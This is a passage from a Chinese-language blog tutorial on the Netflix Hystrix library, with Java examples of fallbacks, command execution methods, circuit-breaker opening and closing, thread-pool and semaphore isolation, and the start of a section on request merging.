class="number">10000</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error Hello world."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> SpringApplication(ServerApplication<span class="class">.<span class="keyword">class</span>).<span class="title">run</span>(<span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hystrix-Client端"><a href="#Hystrix-Client端" class="headerlink" title="Hystrix Client端"></a>Hystrix Client端</h3><p>Client的依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.netflix.hystrix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hystrix-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>新建一个命令类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">    CloseableHttpClient httpClient;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloCommand</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 调用父类的构造器，设置命令组的key，默认用来做线程池的key</span></span><br><span class="line">        <span class="keyword">super</span>(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>));</span><br><span class="line">        <span class="comment">// 创建HttpClient客户端</span></span><br><span class="line">        <span class="keyword">this</span>.httpClient = HttpClients.createDefault();</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">            <span class="comment">// 得到服务响应</span></span><br><span class="line">            HttpResponse response = httpClient.execute(httpGet);</span><br><span class="line">            <span class="keyword">return</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">getFallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"执行HelloCommand的回退方法."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现它的run方法，发出一个HTTP请求。重写getFallback方法，作为调用失败，回退逻辑。</p>
<p>然后在写两个调用类，分别调用Server提供的normalHello和errorHello接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String normalUrl = <span class="string">"http://localhost:8080/normalHello"</span>;</span><br><span class="line">        HelloCommand command = <span class="keyword">new</span> HelloCommand(normalUrl);</span><br><span class="line">        String result = command.execute();</span><br><span class="line">        System.out.println(<span class="string">"服务正常请求结果："</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloErrorMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String normalUrl = <span class="string">"http://localhost:8080/errorHello"</span>;</span><br><span class="line">        HelloCommand command = <span class="keyword">new</span> HelloCommand(normalUrl);</span><br><span class="line">        String result = command.execute();</span><br><span class="line">        System.out.println(<span class="string">"请求异常的服务结果："</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix2.png" alt="调用normalHello"></p>
<p>Hystrix默认的超时时间是1S，所以，调用errorHello接口超时后会走getFallback方法</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix3.png" alt="调用errorHello"></p>
<h2 id="Hystrix的运作流程"><a href="#Hystrix的运作流程" class="headerlink" title="Hystrix的运作流程"></a>Hystrix的运作流程</h2><p><img src="https://huhansi.github.io/images/2020-04-24-hystrix4.png" alt="Hystrix的执行流程"></p>
<p>简单整理下Hystrix的运作流程</p>
<ol>
<li>在命令开始执行时，做一些准备操作</li>
<li>判断是否打开了缓存，如果打开缓存，直接查找缓存并返回结果</li>
<li>判断断路器是否打开，如果打开了表示链路不可用，直接执行回退方法</li>
<li>判断线程池、信号量（计数器）等条件，例如像线程池超负荷，则执行回退方法，否则，就去执行命令的内容</li>
<li>执行命令，计算是否要对断路器进行处理，执行完成后如满足一定条件，则需要开启断路器。如果执行成功，则返回结果，反之则执行回退。</li>
</ol>
<h2 id="Hystrix的使用"><a href="#Hystrix的使用" class="headerlink" title="Hystrix的使用"></a>Hystrix的使用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>一个命令对象可以使用以下方法来执行命令：</p>
<ul>
<li>toObservable：返回一个最原始的可观察的实例（Observable），Observable是R小Java的类，使用该对象可以观察命令的执行过程，并且将执行信息传递给订阅者</li>
<li>observe：调用toObservable方法，获得一个原始的Observable实例后，使用ReplaySubject作为原始Observable的订阅者</li>
<li>queue：通过toObservable方法获取原始的Observable实例，在调用Observable的toBlocking方法得到一个BlockingObservable实例，最后调用BlockingObservable的toFuture方法返回Future实例，调用Future的get方法得到执行结果。</li>
<li>execute：调用queue的get方法返回命令的执行结果，该方法同步执行。</li>
</ul>
<p>上面4个方法，除了execute外，都为异步执行。observe和toObservable方法的区别在于，toObservable方法被调用后，命令不会立即执行，只有当返回的Observable实例被订阅后，才会真正执行命令。而在observe方法的实现中，会调用toObservable得到Observable实例，再对其进行订阅，因此调用observe方法后会立即执行命令（异步）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 使用execute方法</span></span><br><span class="line">        RunCommand c1 = <span class="keyword">new</span> RunCommand(<span class="string">"使用execute方法执行命令"</span>);</span><br><span class="line">        c1.execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用queue方法</span></span><br><span class="line">        RunCommand c2 = <span class="keyword">new</span> RunCommand(<span class="string">"使用queue方法执行命令"</span>);</span><br><span class="line">        c2.queue();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用observe方法</span></span><br><span class="line">        RunCommand c3 = <span class="keyword">new</span> RunCommand(<span class="string">"使用observe方法执行命令"</span>);</span><br><span class="line">        c3.observe();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用toObservable方法</span></span><br><span class="line">        RunCommand c4 = <span class="keyword">new</span> RunCommand(<span class="string">"使用toObservable方法执行命令"</span>);</span><br><span class="line">        Observable&lt;String&gt; ob = c4.toObservable();</span><br><span class="line">        <span class="comment">// 进行订阅，此时会执行命令</span></span><br><span class="line">        ob.subscribe(<span class="keyword">new</span> Observer&lt;String&gt;() &#123;</span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompleted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                 System.out.println(<span class="string">"    命令执行完成"</span>);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(Throwable throwable)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNext</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"    命令执行结果："</span> + s);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         Thread.sleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">RunCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">        String msg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RunCommand</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>));</span><br><span class="line">            <span class="keyword">this</span>.msg = msg;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> String <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            System.out.println(msg);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="属性配置"><a href="#属性配置" class="headerlink" title="属性配置"></a>属性配置</h3><p>使用Hystrix时，可以为命令设置属性。将超时时间由默认的1S改为500ms。但只对当前命令有效。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HelloCommand</span><span class="params">(<span class="keyword">boolean</span> isTimeout)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>)).</span><br><span class="line">                andCommandPropertiesDefaults(HystrixCommandProperties.Setter().</span><br><span class="line">                        withExecutionTimeoutInMilliseconds(<span class="number">500</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果向全局生效，可以使用以下代码片段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ConfigurationManager.getConfigInstance().</span><br><span class="line">                setProperty(<span class="string">"hystrix.command.default.execution.isolation.thread.timoutInMilliseconds"</span>, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>

<p>除了超时配置外，还需要了解下命令的相关名称，可以为命令设置以下名称：</p>
<ul>
<li>命令组名称（GroupKey）：必须提供命令组名称，默认情况下，全局维护的线程池Map以该值作为Key，该Map的value为执行命令的线程池</li>
<li>命令名称（CommandKey）：可选参数</li>
<li>线程池名称（ThreadPoolKey）：指定了线程的key后，全局维护的线程池Map将以该值作为key</li>
</ul>
<p>以下的代码片段分别设置上面的三个key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">super</span>(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">"group-key"</span>)).</span><br><span class="line">                    andCommandKey(HystrixCommandKey.Factory.asKey(<span class="string">"command-key"</span>)).</span><br><span class="line">                    andThreadPoolKey(HystrixThreadPoolKey.Factory.asKey(<span class="string">"ThreadPoolKey"</span>)));</span><br></pre></td></tr></table></figure>

<h3 id="断路器开启"><a href="#断路器开启" class="headerlink" title="断路器开启"></a>断路器开启</h3><p>断路器一旦开启，就会直接调用回退方法，不再执行命令，而且也不会更新链路的健康状况。断路器的开启需要满足两个条件：</p>
<ul>
<li>整个链路达到一定阈值，默认情况下，10秒内产生超过20次请求，则符合第一个条件</li>
<li>满足第一个条件的情况下，如果请求的错误百分比大于阈值，则会打开断路器默认为50%</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.netflix.config.ConfigurationManager;</span><br><span class="line"><span class="keyword">import</span> com.netflix.hystrix.HystrixCommand;</span><br><span class="line"><span class="keyword">import</span> com.netflix.hystrix.HystrixCommandGroupKey;</span><br><span class="line"><span class="keyword">import</span> com.netflix.hystrix.HystrixCommandProperties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OpenTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.metrics.rollingStats.timeInMilliseconds"</span>, <span class="number">10000</span>);</span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.circuitBreaker.requestVolumeThreshold"</span>, <span class="number">10</span>);</span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.circuitBreaker.errorThresholdPercentage"</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">15</span>;i++) &#123;</span><br><span class="line">            MyCommand c = <span class="keyword">new</span> MyCommand();</span><br><span class="line">            c.execute();</span><br><span class="line">            <span class="keyword">if</span> (c.isCircuitBreakerOpen()) &#123;</span><br><span class="line">                System.out.println(<span class="string">"断路器被打开，执行第"</span> + (i + <span class="number">1</span>) + <span class="string">"个命令"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyCommand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>)).</span><br><span class="line">                    andCommandPropertiesDefaults(HystrixCommandProperties.Setter().withExecutionTimeoutInMilliseconds(<span class="number">500</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> String <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 模拟处理超时</span></span><br><span class="line">            Thread.sleep(<span class="number">800</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> String <span class="title">getFallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix5.png" alt="断路器"></p>
<h3 id="断路器关闭"><a href="#断路器关闭" class="headerlink" title="断路器关闭"></a>断路器关闭</h3><p>断路器打开后，在一段时间内，命令不会再执行（一直触发回退），这段时间我们称作“休眠期”。休眠期的默认值为5秒，休眠期结束后，Hystrix会尝试性地执行一次命令，此时断路器的状态不是开启，也不是关闭，而是半开的状态，如果这一次命令执行成功，则会关闭断路器并清空链路的健康信息；如果执行失败，断路器会继续保持打开的状态。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CloseTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 10秒钟内有3个请求就满足第一个开启断路器的条件</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.metrics.rollingStats.timeInMilliseconds"</span>, <span class="number">10000</span>);</span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.circuitBreaker.requestVolumeThreshold"</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="comment">// 请求的失败率，默认为50%</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.circuitBreaker.errorThresholdPercentage"</span>, <span class="number">50</span>);</span><br><span class="line">        <span class="comment">// 设置休眠期，断路器打开后，这段时间不会再执行命令，默认值为5秒，此处设置为3秒</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.circuitBreaker.sleepWindowInMilliseconds"</span>, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isTimeout = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">            MyCommand c = <span class="keyword">new</span> MyCommand(isTimeout);</span><br><span class="line">            c.execute();</span><br><span class="line">            <span class="comment">// 输出健康状态等信息</span></span><br><span class="line">            HystrixCommandMetrics.HealthCounts hc = c.getMetrics().getHealthCounts();</span><br><span class="line">            System.out.println(<span class="string">"断路器状态："</span> + c.isCircuitBreakerOpen() + <span class="string">" 请求总数： "</span> + hc.getTotalRequests());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c.isCircuitBreakerOpen()) &#123;</span><br><span class="line">                isTimeout = <span class="keyword">false</span>;</span><br><span class="line">                System.out.println(<span class="string">"断路器被打开,等待休眠期结束"</span>);</span><br><span class="line">                <span class="comment">// 休眠期会在3秒钟结束，此处休眠4秒</span></span><br><span class="line">                Thread.sleep(<span class="number">4000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">boolean</span> isTimeout;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyCommand</span><span class="params">(<span class="keyword">boolean</span> isTimeout)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(HystrixCommand.Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>)).</span><br><span class="line">                    andCommandPropertiesDefaults(HystrixCommandProperties.Setter().withExecutionTimeoutInMilliseconds(<span class="number">500</span>)));</span><br><span class="line">            <span class="keyword">this</span>.isTimeout = isTimeout;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> String <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 让外部决定是否超时</span></span><br><span class="line">            <span class="keyword">if</span> (isTimeout) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">800</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">200</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> String <span class="title">getFallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix6.png" alt="断路器关闭"></p>
<h3 id="隔离机制"><a href="#隔离机制" class="headerlink" title="隔离机制"></a>隔离机制</h3><p>命令的真正执行，除了断路器要关闭以外，还要再过一关：执行命令的线程池或者信号量是否满载。如果满载，命令就不会执行，而是直接触发回退，这样的机制，在控制命令的执行上，实现了错误的隔离。Hystrix提供了两种隔离策略：</p>
<ul>
<li>THREAD：默认值，由线程池来决定命令的执行，如线程池满载，则不会执行命令。Hystrix使用了ThreadPoolExecutor来控制线程池的行为，线程池的默认大小为10.</li>
<li>SEMAPHORE：由信号量来决定命令的执行，当请求的并发数高于阈值时，就不再执行命令。</li>
</ul>
<p>相对于线程策略，信号量策略开销更小，但是该策略不支持超时以及异步，除非对调用的服务有足够的信任，否则不建议使用该策略进行隔离。</p>
<p>下面举个例子，来看看两个隔离方式有什么区别、</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyCommand</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>)));</span><br><span class="line">        <span class="keyword">this</span>.index = index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">500</span>);</span><br><span class="line">        System.out.println(<span class="string">"执行方法，当前索引："</span> + index);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">getFallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"执行fallback，当前索引："</span> + index);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程池隔离</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadIso</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 配置线程池大小为3</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.threadpool.default.coreSize"</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">6</span>;i++) &#123;</span><br><span class="line">            MyCommand c = <span class="keyword">new</span> MyCommand(i);</span><br><span class="line">            c.queue();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信号量隔离</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SemaphoreIso</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 配置使用信号量的策略进行隔离</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.execution.isolation.strategy"</span>,</span><br><span class="line">                HystrixCommandProperties.ExecutionIsolationStrategy.SEMAPHORE);</span><br><span class="line">        <span class="comment">// 设置最大并发数，默认值为10，本例设置为2</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.execution.isolation.semaphore.maxConcurrentRequests"</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 设置执行回退方法的最大并发，默认值为10，本例设置为20</span></span><br><span class="line">        ConfigurationManager.getConfigInstance().setProperty(<span class="string">"hystrix.command.default.fallback.isolation.semaphore.maxConcurrentRequests"</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">6</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> index = i;</span><br><span class="line">            Thread t = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    MyCommand c = <span class="keyword">new</span> MyCommand(index);</span><br><span class="line">                    c.execute();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行ThreadIso中的main方法，可以看到有3次命令会触发回退。</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix8.png" alt="信号量隔离"></p>
<p>执行SemaphoreIso中的方法，可以看到有4次命令会触发回退。</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix7.png" alt="信号量隔离"></p>
<h3 id="合并请求"><a href="#合并请求" class="headerlink" title="合并请求"></a>合并请求</h3><p>默认情况下，Hystrix会为命令分配线程池来执行命令实例，线程池会消耗一定的性能。对于一些同类型的请求（URL相同，参数不同），Hystrix提供了合并请求的功能，在一次请求的过程中，可以将一个时间段内的相同请求（参数不同），收集到同一个命令中执行，这样就节省了线程的开销，减少了网络连接，从而提升了执行的性能。</p>
<p>实现合并请求的功能，至少包含以下3个条件：</p>
